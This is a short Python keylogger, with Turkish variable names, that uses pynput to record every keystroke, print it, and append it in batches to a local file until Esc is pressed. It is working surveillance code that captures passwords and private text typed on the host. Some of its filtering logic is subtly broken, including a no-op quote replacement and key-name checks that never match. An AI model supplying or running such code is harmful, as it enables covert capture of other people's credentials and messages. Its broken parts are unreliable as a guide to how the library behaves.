import pynput
from pynput.keyboard import Key, Listener

sayac = 0
tuslar = []

def tusabasim(tus):
    global tuslar, sayac
    tuslar.append(tus)
    sayac += 1
    print(tus)
    if (sayac >= 10):
        sayac = 0
        save(tuslar)
        tuslar = []

def save(tuslar):
    with open("keylogger.txt", "a") as file:
        for tus in tuslar:
            _tus = str(tus).replace("'","'")
            if _tus.find("bosluk") > 0:
                file.write("\n")
            elif _tus.find("tus") == -1:
                file.write(_tus)

def release(tus):
    if tus == Key.esc:
        return False

with Listener(on_press = tusabasim, on_release = release) as listener:
    listener.join()